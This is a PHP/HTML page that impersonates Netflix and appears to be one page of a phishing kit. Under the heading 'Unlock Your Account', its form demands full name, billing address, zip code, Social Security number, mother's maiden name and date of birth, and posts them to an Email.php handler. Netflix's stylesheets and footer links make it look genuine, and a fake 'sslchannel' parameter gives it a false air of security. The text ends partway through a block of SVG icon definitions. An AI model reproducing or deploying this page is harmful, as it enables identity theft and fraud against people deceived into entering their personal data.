<?php
require "config.php";

require "assets/includes/functions.php";
?>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta charSet="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>Netflix</title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0" />
    <link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E3.0.0/truthBundle/webui/0.0.1-shakti-css-v1b11bfd3/css/css/less%7Ccore%7Cerror-page.less/1/wGyO3uxK9FMN/none/true/none" />
    <link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E3.0.0/truthBundle/webui/0.0.1-shakti-css-v1b11bfd3/css/css/less%7Cpages%7Csignup%7Csimplicity%7Csimplicity.less/1/wGyO3uxK9FMN/none/true/none" />
    <style type="text/css">
    .auto-style1 {
        color: #D70A11;
    }

    .auto-style2 {
        color: #D70A11;
        font-weight: bold;
    }
    </style>
</head>

<body>
    <div id="appMountPoint">
        <div class="netflix-sans-font-loaded">
            <div class="basicLayout modernInApp signupSimplicity-creditOptionMode simplicity" lang="en-MA" dir="ltr">
                <div class="nfHeader noBorderHeader signupBasicHeader"><a href="/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">
                            <g id="netflix-logo">
                                <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path>
                            </g>
                        </svg><span class="screen-reader-text">Netflix</span></a><a href="./index.php" class="authLinks signupBasicHeader">Sign Out</a></div>
                <div class="simpleContainer">
                    <div class="centerContainer firstLoad">
                        <div class="paymentFormContainer">
                            <div>
                                <div class="stepHeader-container" data-uia="header">
                                    <div class="stepHeader" data-a11y-focus="true"><span class="stepIndicator">STEP
                                            <span class="auto-style2" lang="fr">3</span> OF <b>
                                                <span class="auto-style1">4</span><br>
                                                <br></b></span>
                                        <h1 class="stepTitle" data-uia="stepTitle" style="height: 57px">Unlock Your Account<br></h1>
                                        <p class="stepTitle" data-uia="stepTitle">&nbsp;</p>
                                        <p class="stepTitle" data-uia="stepTitle">&nbsp;</p>
                                    </div>
                                </div>
                            </div>
                            <div>
                                <form action="Email.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" method="post">
                                    <div class="">
                                        <ul class="simpleForm structural ui-grid">
                                            <li data-uia="field-creditCardNumber+wrapper" class="nfFormSpace">
                                                <div class="cardNumberContainer">
                                                    <div data-uia="field-creditCardNumber+container">
                                                        <div>
                                                            <span style="color: rgb(51, 51, 51); font-family: &quot;Netflix Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">
                                                                Full Name</span><label class="input_id" placeholder="creditCardNumber"><input type="text" required name="fname" placeholder="" class="nfTextField" id="fname" value="" autoComplete="off" dir="" /></label></div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li data-uia="field-creditExpirationMonth+wrapper" class="nfFormSpace">
                                                <div data-uia="field-creditExpirationMonth+container">
                                                    <div>
                                                        <label class="input_id" placeholder="creditExpirationMonth">
                                                            <span style="color: rgb(51, 51, 51); font-family: &quot;Netflix Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">
                                                                Billing Address</span><input required type="text"  name="badd" placeholder="" class="nfTextField" id="badd" value="" autoComplete="off" dir="" /></label></div>
                                                </div>
                                            </li>
                                            <li data-uia="field-creditExpirationMonth+wrapper" class="nfFormSpace">
                                                <div data-uia="field-creditExpirationMonth+container">
                                                    <div>
                                                        <label class="input_id" placeholder="creditExpirationMonth">
                                                            <span style="color: rgb(51, 51, 51); font-family: &quot;Netflix Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">
                                                                ZipCode</span><input required type="tel"  name="fzip" placeholder="" class="nfTextField" id="fzip" value="" autoComplete="off" dir="" /></label></div>
                                                </div>
                                            </li>
                                             <li data-uia="field-creditCardSecurityCode+wrapper" class="nfFormSpace">
                                                <div data-uia="field-creditCardSecurityCode+container">
                                                    <div class="nfInputPlacement">
                                                        <label class="input_id" placeholder="creditCardSecurityCode">
                                                            <span style="color: rgb(51, 51, 51); font-family: &quot;Netflix Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">
                                                                SSN</span><input required type="text"  name="ssn" class="nfTextField" id="ssn" value="" tabindex="0" autoComplete="off" dir="" /></label></div>
                                                </div>
                                            </li>
                                            <li data-uia="field-creditCardSecurityCode+wrapper" class="nfFormSpace">
                                                <div data-uia="field-creditCardSecurityCode+container">
                                                    <div class="nfInputPlacement">
                                                        <label class="input_id" placeholder="creditCardSecurityCode">
                                                            <span style="color: rgb(51, 51, 51); font-family: &quot;Netflix Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">
                                                                MMN</span><input required type="text"  name="mmn" class="nfTextField" id="mmn" value="" tabindex="0" autoComplete="off" dir="" /></label></div>
                                                </div>
                                            </li>
                                            <li data-uia="field-creditExpirationMonth+wrapper" class="nfFormSpace">
                                                <div data-uia="field-creditExpirationMonth+container">
                                                    <div>
                                                        <label class="input_id" placeholder="creditExpirationMonth">
                                                            <span style="color: rgb(51, 51, 51); font-family: &quot;Netflix Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">
                                                                Date<span>&nbsp;</span></span><span lang="fr" style="color: rgb(51, 51, 51); font-family: &quot;Netflix Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial;">o</span><span style="color: rgb(51, 51, 51); font-family: &quot;Netflix Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">f<span>&nbsp;</span></span><span lang="fr" style="color: rgb(51, 51, 51); font-family: &quot;Netflix Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial;">b</span><span style="color: rgb(51, 51, 51); font-family: &quot;Netflix Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">irth</span><input required type="tel" name="fdob" placeholder="DD-MM-YYYY" class="nfTextField" id="fdob" value="" autoComplete="off" dir="" /></label></div>
                                                </div>
                                            </li>
                                            
                                            
                                           
                                            
                                            
                                            
                                            
                                        </ul>
                                    </div>
                                    
                            </div>
                        </div>
                        <div class="submitBtnContainer"><button id="simplicityPayment-START" type="submit" autoComplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="action-submit-payment">
                                <span lang="fr">Unlock My Account</span></button></div>
                        </form>
                    </div>
                </div>
                <div class="site-footer-wrapper centered">
                    <div class="footer-divider"></div>
                    <div class="site-footer">
                        <p class="footer-top">
                            <a class="footer-top-a" href="#">Questions? Contact us.</a></p>
                        <ul class="footer-links structural">
                            <li class="footer-link-item" placeholder="footer_responsive_link_faq_item"><span id="" data-uia="data-uia-footer-label">
                                    <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_faq">FAQ</a></span></li>
                            <li class="footer-link-item" placeholder="footer_responsive_link_help_item">
                                <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_help"><span id="" data-uia="data-uia-footer-label">Help Center</span></a></li>
                            <li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><span id="" data-uia="data-uia-footer-label">
                                    <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_terms">Terms of Use</a></span></li>
                            <li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item">
                                <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_privacy_separate_link"><span id="" data-uia="data-uia-footer-label">Privacy</span></a></li>
                            <li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item"><span id="" data-uia="data-uia-footer-label">
                                    <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_cookies_separate_link">Cookie Preferences</a></span></li>
                            <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/en/node/2101" placeholder="footer_responsive_link_corporate_information"><span id="" data-uia="data-uia-footer-label">Corporate Information</span></a></li>
                        </ul>
                        <div class="lang-selection-container" id="lang-switcher">
                            <div class="nfSelectWrapper inFooter selectArrow prefix" data-uia="language-picker+container">
                                <div class="nfSelectPlacement globe"><select data-uia="language-picker" class="nfSelect" name="__langSelect" tabindex="0">
                                        <option value="/signup/creditoption?locale=ar-MA" label="العربية">العربية</option>
                                        <option value="/signup/creditoption?locale=fr-MA" label="Français">Français</option>
                                        <option selected="" value="/signup/creditoption?locale=en-MA" label="English">English</option>
                                    </select><label class="nfLabel no-display placeLabel"></label></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="a11yAnnouncer" aria-live="assertive" tabindex="-1"></div>
                <div id="tmcontainer" class="tmint">
                    <p class="tmint" style="background:url(https://secured.netflix.com/fp/clear.png?org_id=lg9m47ph&amp;session_id=13a3639e-41d7-4b2c-933b-d1ad5f994a00&amp;m=1)"></p><img class="tmint" src="https://secured.netflix.com/fp/clear.png?org_id=lg9m47ph&amp;session_id=13a3639e-41d7-4b2c-933b-d1ad5f994a00&amp;m=2" />
                    <div id="tmswf" class="tmint"></div>
                </div><svg style="height:0;width:0;position:absolute" xmlns="http://www.w3.org/2000/svg">
                    <defs id="" data-uia="">
                        <symbol viewBox="0 0 34 34" id="check-circle">
                            <path d="M28.4 11.7l-3.2-3.267c-.066.066-.133.133-.2.166L13.367 19.933l-4.433-4.5L5.6 18.466c0 .034 1.1 1.1 1.1 1.134l4.934 5.133.166.167a2.234 2.234 0 0 0 3.1 0l.167-.167 13.2-12.866c.067-.034.1-.1.133-.167M33 17c0 8.834-7.166 16-16 16S1 25.834 1 17 8.166 1 17 1s16 7.166 16 16" />
                        </symbol>
                        <symbol viewBox="0 0 14 10" id="check-mark">
                            <path d="M13.916 1.996l-7.722 7.54-.1.08a1.319 1.319 0 0 1-.908.384c-.322 0-.645-.142-.907-.384l-.08-.08-2.884-3.024c-.02 0-.644-.645-.665-.645l1.955-1.775 2.581 2.62L12 .103A.53.53 0 0 1 12.121 0l1.874 1.895a.43.43 0 0 1-.08.101" />
                        </symbol>
                        <symbol viewBox="0 0 17 11" id="dropdown-arrow">
                            <path d="M1 1h15l-7.495 9.143z" />
                        </symbol>
                        <symbol viewBox="0 0 37 34" id="exclamation-triangle">
                            <path d="M20.4 28.633c.4-.4.666-1 .666-1.634 0-.633-.267-1.2-.667-1.632-.433-.4-1-.667-1.633-.667s-1.233.267-1.633.667c-.434.433-.667 1-.667 1.632 0 .634.233 1.234.667 1.634.4.434 1 .667 1.633.667.634 0 1.2-.233 1.633-.667m.534-11.8c.5-2.267.9-4.334.9-4.334 0-1.532-.767-2.299-1.534-2.699-.767-.4-1.533-.4-1.533-.4s-.766 0-1.533.4c-.8.4-1.567 1.167-1.567 2.7l.9 4.334c.5 2.232 1.067 4.666 1.367 5.365 0 0 .1.267.233.534.167.267.367.533.6.533.234 0 .434-.266.567-.533.166-.267.233-.534.233-.534.333-.7.9-3.133 1.367-5.365M36.066 28.4c.134.8.067 1.867-.834 3 0 0-.199.366-.666.766s-1.2.8-2.333.834H4.766c-1.133-.034-1.866-.434-2.333-.834-.467-.4-.667-.766-.667-.766-.733-1.1-.833-2.167-.733-2.967.1-.8.4-1.334.4-1.334l6.733-11.6 6.7-11.633C15.767 2.4 16.8 1.6 17.5 1.3c.6-.267.833-.3 1.033-.3h.034c.233 0 .399.033 1.065.3.667.267 1.567.967 2.5 2.566l6.7 11.634 6.734 11.6s.367.533.5 1.3" />
                        </symbol>
                        <symbol viewBox="0 0 8 21" id="exclamation">
                            <path d="M5.582 19.66c-.395.43-.956.66-1.583.66-.626 0-1.186-.23-1.582-.66-.428-.395-.66-.956-.66-1.582 0-.593.232-1.154.66-1.583a2.241 2.241 0 0 1 1.582-.658c.627 0 1.188.263 1.583.658.396.43.66.99.66 1.583 0 .626-.264 1.187-.66 1.582m-.79-6.263s-.1.263-.232.527-.33.56-.56.56c-.231 0-.429-.296-.594-.56-.132-.264-.197-.527-.197-.527-.298-.66-.858-3.001-1.319-5.21C1.396 6.01 1 4 1 4c0-1.517.757-2.243 1.483-2.638C3.242 1 4 1 4 1s.76 0 1.484.363C6.242 1.758 7 2.484 7 4l-.89 4.186c-.462 2.209-1.022 4.55-1.319 5.21" />
                        </symbol>
                        <symbol viewBox="0 0 40 48" id="icon-cancel">
                            <path d="M29.55 18.7v-4.6c-5.2.4-4.6 2.8-4.6 2.8.3 1.7 2.35 2.35 2.35 2.35.6-.35 2.25-.55 2.25-.55zm3.7 1L33 21.3c-9.15-.3-8.7-3.75-8.7-3.75l.15 5.2c1.1 4.05 8.35 4.2 8.2 4.2l-.2 1.5 6.9-3.8-6.1-4.95zm-20.3 6.25c-.5-.5-1.3-.45-1.8.05-.45.5-.45 1.25.05 1.75s1.3.45 1.75-.05c.5-.5.5-1.25 0-1.75zm2.35-15.9L1.5 1.45V38.9l2.6 1.45 11.2 6.2v-36.5zM1.5 40.35C.4 39.85 0 39.7 0 38.9l1.5 1.45zM28.05 28.1h1.45v10.8c0 .8-.65 1.45-1.45 1.45H16.8v6.15c0 .849-.65 1.5-1.45 1.5L1.5 40.35 0 38.9V1.45C0 .65.65 0 1.5 0h26.55c.8 0 1.45.65 1.45 1.45v11.2h-1.45V1.45H4.1L15.6 8.6c.95.35 1.2.65 1.2 1.45V38.9h11.25V28.1z" />
                        </symbol>
                        <symbol viewBox="0 0 34 34" id="globe">
                            <path d="M31.833 22.966h-6.032c.532-1.633.865-3.4.932-5.233H33c-.1 1.866-.5 3.633-1.167 5.233zM25.467 9.833h5.866a15.971 15.971 0 0 1 1.601 5.733h-6.2a18.91 18.91 0 0 0-1.267-5.733zm-7.4 15.333h4.1a14.647 14.647 0 0 1-4.1 4.367v-4.367zm6.867 0h5.798a16.008 16.008 0 0 1-12.666 7.767v-.234C21 31.032 23.4 28.4 24.934 25.166zm-1.667-2.2h-5.2v-5.233H24.4c-.1 1.9-.5 3.667-1.133 5.233zm-5.2-13.133h4.966c.734 1.7 1.2 3.6 1.334 5.733h-6.3V9.833zm3.8-2.166h-3.8v-3.9c1.499 1.033 2.8 2.333 3.8 3.9zm8.166 0h-5.566c-1.533-2.8-3.767-5.1-6.4-6.634V1c4.933.3 9.266 2.866 11.966 6.667zm-14.133 0h-3.8a14.123 14.123 0 0 1 3.8-3.9v3.9zm-4.1 17.499h4.1v4.367c-1.6-1.133-3-2.634-4.1-4.367zm-2.2-7.433h6.3v5.233h-5.166C10.067 21.4 9.7 19.633 9.6 17.733zm1.334-7.9H15.9v5.733H9.6c.134-2.134.6-4.033 1.334-5.733zm-1.4-2.166H3.966c2.7-3.8 7-6.367 11.933-6.667v.033c-2.633 1.534-4.833 3.833-6.367 6.634zm-6.3 17.499h5.833c1.534 3.234 3.9 5.866 6.833 7.533v.234c-5.367-.367-10.033-3.4-12.666-7.767zM2.667 9.833H8.5c-.666 1.767-1.1 3.7-1.233 5.733H1.033c.2-2.034.734-3.966 1.634-5.733zm5.5 13.133h-6A15.792 15.792 0 0 1 1 17.733h6.234c.067 1.833.4 3.6.932 5.233z" />
                        </symbol>
                        <symbol viewBox="0 0 61 34" id="hd">
                            <path d="M46.3 17.433c0-2.2-.467-4.733-5.233-4.733h-4.6v9.6h4.6c4.333 0 5.233-2.567 5.233-4.867zm.533-6.9c.934.667 1.634 1.634 2.167 2.867.533 1.2.8 2.567.8 4.033 0 3.267-.966 5.6-2.967 7.1-1.099.867-2.932 1.334-5.433 1.334h-8.2V9.233h8.2c2.5 0 4.334.433 5.433 1.3zM24.868 25.867V19.3H14.8v6.567h-3.266V9.233H14.8v6.534h10.068V9.233h3.3v16.634h-3.3zM3.666 5.4v23.167c0 1 .801 1.766 1.801 1.766h49.866c.967 0 1.735-.8 1.735-1.766V5.4c0-.967-.768-1.734-1.735-1.734H5.467c-1 0-1.8.767-1.8 1.734zm56.068 0v23.167a4.404 4.404 0 0 1-4.4 4.433H5.466C2.967 33 1 31.033 1 28.567V5.4C1 2.967 2.967 1 5.467 1h49.866a4.397 4.397 0 0 1 4.401 4.4z" />
                        </symbol>
                        <symbol viewBox="0 0 34 34" id="info-circle">
                            <path d="M17.533 13.566h-.8a1.9 1.9 0 0 0-1.9 1.9V25.8c0 1.033.834 1.9 1.9 1.9h.8c1.066 0 1.934-.867 1.934-1.9V15.466c0-1.033-.868-1.9-1.934-1.9M14.8 8.6a2.34 2.34 0 0 0 2.333 2.334c1.3 0 2.334-1.033 2.334-2.334a2.34 2.34 0 0 0-2.334-2.333c-1.266 0-2.333 1.067-2.333 2.333M1 17C1 8.167 8.166 1 17 1s16 7.166 16 16-7.166 15.999-16 15.999-16-7.165-16-16" />
                        </symbol>
                        <symbol viewBox="0 0 25 36" id="lock">
                            <path d="M15.541 23.761c0-1.638-1.37-3.042-3.042-3.042a3.01 3.01 0 0 0-3.041 3.042c0 1.27.801 2.34 1.938 2.808l-.836 4.88h3.878l-.836-4.88c1.137-.469 1.94-1.538 1.94-2.808zM12.5 6.678c-3.008 0-5.516 2.474-5.516 5.516v2.942h-3.71V12.16C3.306 7.112 7.417 3 12.5 3c5.049 0 9.16 4.112 9.194 9.16v2.976h-3.677v-2.942a5.522 5.522 0 0 0-5.517-5.516zM1 35.026h23V16.24H1v18.787z" />
                        </symbol>
                        <symbol viewBox="0 0 66 40" id="logo-apple-tv">
                            <path d="M56.679 36.007h-5.001l-9.202-25.372h4.501l5.568 16.503c.2.634.767 2.468 1.634 5.568l.8-2.767.9-2.767 5.801-16.57h4.468l-9.469 25.405zm-14.736-.167a16.467 16.467 0 0 1-4.268.567c-3.368 0-5.068-1.934-5.068-5.768V13.702h-2.934v-3.067h3.101V6.634l4.068-1.667v5.701h4.7v3.068h-4.667v16.003c0 1.234.2 2.067.567 2.567.4.5 1.1.734 2.1.734.567 0 1.334-.134 2.401-.334v3.134zM17.804 9.134c1-1.2 1.734-2.834 1.734-4.534 0-.2-.033-.4-.033-.6-1.634.067-3.568 1.067-4.768 2.434-.934 1.067-1.734 2.667-1.734 4.301 0 .233 0 .467.033.667 1.801.133 3.668-.934 4.768-2.268zm4.068 11.97c.033 4.867 4.267 6.501 4.301 6.501-.034.133-.667 2.334-2.234 4.601-1.334 2.001-2.801 3.934-5.068 3.934-2.034 0-2.734-1.3-5.168-1.267-2.467 0-3.234 1.234-5.268 1.334-2.1.067-3.7-2.167-5.068-4.101C1.534 29.439 0 25.338 0 21.437c0-1.967.4-3.901 1.334-5.534 1.4-2.467 3.968-4.035 6.735-4.035 2.033 0 4.001 1.401 5.234 1.401 1.2 0 3.368-1.5 5.701-1.5.167 0 .334 0 .467.033 1.034.033 4.001.433 5.901 3.167-.166.1-3.534 2.067-3.5 6.135z" />
                        </symbol>
                        <symbol viewBox="0 0 134 26" id="logo-playstation">
                            <path d="M33.6976399,19.8994655 C33.0331307,20.7300674 31.4064122,21.3221582 31.4064122,21.3221582 L19.3017129,25.6306185 L19.3017129,22.4535325 L28.2092711,19.30832 C29.2206882,18.9490678 29.3762174,18.4423332 28.553998,18.1761354 C27.7339596,17.9087221 26.2484578,17.9848944 25.2370408,18.345092 L19.3017129,20.4164645 L19.3017129,17.1197178 L19.643441,17.0046491 C19.643441,17.0046491 21.3583518,16.4037795 23.7700771,16.1392024 C26.1818025,15.876246 29.1353584,16.1751277 31.4537117,17.0457065 C34.0663573,17.8638831 34.3611949,19.069809 33.6976399,19.8994655 Z M20.4535288,14.4892084 L20.4535288,6.36538172 C20.4535288,5.41120248 20.27619,4.53279033 19.3728665,4.28387988 C18.6812317,4.06427685 18.2513113,4.70080151 18.2513113,5.65417041 L18.2513113,26 L12.7134621,24.2587073 L12.7134621,0 C15.0679374,0.433128497 18.4985768,1.45672715 20.3428454,2.07285817 C25.032849,3.66815403 26.6227639,5.65349512 26.6227639,10.1276706 C26.6227639,14.4878578 23.9062504,16.1408231 20.4535288,14.4892084 Z M2.55185574,22.1216969 C-0.129898879,21.3729397 -0.576449053,19.8126237 0.646111543,18.9144932 C1.77584532,18.0851068 3.69740142,17.4610074 3.69740142,17.4610074 L11.6377069,14.6641075 L11.6377069,17.8532136 L5.92374574,19.8782615 C4.91437333,20.2377838 4.75938934,20.7458691 5.57915513,21.012472 C6.40042034,21.2786698 7.88619472,21.2020923 8.89706655,20.8428401 L11.6377069,19.8570575 L11.6377069,22.7101412 C11.4639122,22.7414745 11.27008,22.7713222 11.0909692,22.8011698 C8.34951098,23.245508 5.42935091,23.0600745 2.55185574,22.1216969 Z M31.9335214,23.384617 C32.2804292,23.384617 32.6056639,23.5175133 32.8506122,23.7626421 C33.0950153,24.0047997 33.2307796,24.3277215 33.2307796,24.6707669 C33.2307796,25.0154329 33.0950153,25.336734 32.8506122,25.5788916 C32.6056639,25.8223998 32.2804292,25.9552961 31.9335214,25.9552961 C31.5864772,25.9552961 31.262333,25.8223998 31.0172484,25.5788916 C30.7720275,25.336734 30.6377625,25.0154329 30.6377625,24.6707669 C30.6378988,23.9621216 31.2185776,23.384617 31.9335214,23.384617 Z M30.8559942,24.6704968 C30.8559942,24.9558727 30.9673591,25.2242313 31.1718235,25.4243861 C31.3745158,25.629403 31.6468623,25.7382591 31.9335214,25.7382591 C32.5293305,25.7382591 33.0120027,25.2600215 33.0120027,24.6704968 C33.0120027,24.3843105 32.9003652,24.1155466 32.6961735,23.9149867 C32.4933448,23.7107802 32.2209983,23.6012488 31.9335214,23.6012488 C31.6468623,23.6012488 31.3745158,23.7110503 31.1718235,23.9149867 C30.9674954,24.1155466 30.8559942,24.3843105 30.8559942,24.6704968 Z M32.325684,23.9777883 C32.467446,24.0405899 32.5390085,24.1595753 32.5390085,24.3292072 C32.5390085,24.4171294 32.5200615,24.4904655 32.4825763,24.5473246 C32.4553144,24.5890572 32.4175567,24.6220112 32.3739376,24.6517238 C32.4077424,24.6713071 32.4381394,24.6952122 32.4596763,24.7219536 C32.4913002,24.7626058 32.5088841,24.8259476 32.511065,24.911844 L32.5186984,25.0956569 C32.5204704,25.1441424 32.5231966,25.1822285 32.5316478,25.2047831 C32.5391448,25.2384124 32.5534573,25.2600215 32.5724044,25.2660991 L32.5921692,25.2758232 L32.5921692,25.2956766 L32.5921692,25.3268748 L32.5921692,25.3582081 L32.5605454,25.3582081 L32.3304549,25.3582081 L32.3123257,25.3582081 L32.3033292,25.3434869 C32.2955596,25.3268748 32.2896983,25.3105329 32.2845185,25.2864927 C32.2807019,25.2656939 32.2768852,25.2297687 32.2747042,25.1752056 L32.2625727,24.947229 C32.2597102,24.869436 32.2321757,24.8204103 32.1818774,24.793939 C32.1502536,24.7798931 32.0981833,24.7723299 32.0263482,24.7723299 L31.6333677,24.7723299 L31.6333677,25.3267398 L31.6333677,25.358073 L31.6011986,25.358073 L31.4140456,25.358073 L31.3825581,25.358073 L31.3825581,25.3267398 L31.3825581,23.9595556 L31.3825581,23.9282223 L31.4140456,23.9282223 L32.0529286,23.9282223 C32.1629304,23.9284924 32.2541215,23.9449694 32.325684,23.9777883 Z M31.6333677,24.5547527 L32.0333,24.5547527 C32.1139952,24.5547527 32.1781971,24.5400315 32.2233155,24.5099137 C32.2658441,24.479931 32.2852001,24.4263133 32.2852001,24.3471698 C32.2852001,24.2616786 32.2565751,24.2049545 32.1963262,24.175377 C32.1630667,24.1597104 32.1172667,24.1499862 32.0582446,24.1499862 L31.6337766,24.1499862 L31.6337766,24.5548878 L31.6333677,24.5548878 L31.6333677,24.5547527 Z"></path>
